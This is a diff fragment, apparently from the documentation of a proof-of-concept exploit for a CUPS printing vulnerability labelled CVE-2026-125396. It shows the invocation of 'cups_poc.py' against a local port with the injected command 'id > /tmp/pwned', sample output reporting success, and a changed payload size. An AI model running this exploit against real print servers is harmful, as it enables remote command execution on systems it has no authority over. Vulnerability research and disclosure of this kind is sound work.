@@ -138,7 +138,7 @@ python3 cups_poc.py -t 127.0.0.1:6310 -q u2s --cmd 'id > /tmp/pwned'
 ```
 Upload2Shell 0.2.0  (CVE-2026-125396)
   target   127.0.0.1:6310/u2s
-  payload  4536 bytes
+  payload  4512 bytes
   command  id > /tmp/pwned
   status   0x0000 (successful-ok)  HTTP 200
   job-id   1
